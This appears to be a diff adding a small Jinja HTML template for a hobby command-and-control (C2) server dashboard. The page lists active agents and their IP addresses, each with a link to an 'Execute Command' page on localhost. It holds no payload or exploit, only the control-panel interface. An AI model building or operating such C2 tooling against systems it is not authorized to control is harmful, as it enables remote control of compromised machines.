@@ -1,0 +1,18 @@
+{% extends 'index.html' %}
+
+{% block content %}
+    <h1 class="title is-2 has-text-centered">Ace's C2 Server</h1>
+    <h2 class="title is-3">
+        Here is a list of active agents:
+    </h2>
+    <h3>
+    {% for i in threads %}
+    {{ i.name }}
+    {{ ips[threads.index(i)] }}
+    <a href="http://127.0.0.1:5000/{{i.name}}/execcmd"> Execute Command </a>
+    {% endfor %}
+    </h3>
+           
+    <br>
+
+{% endblock %}     
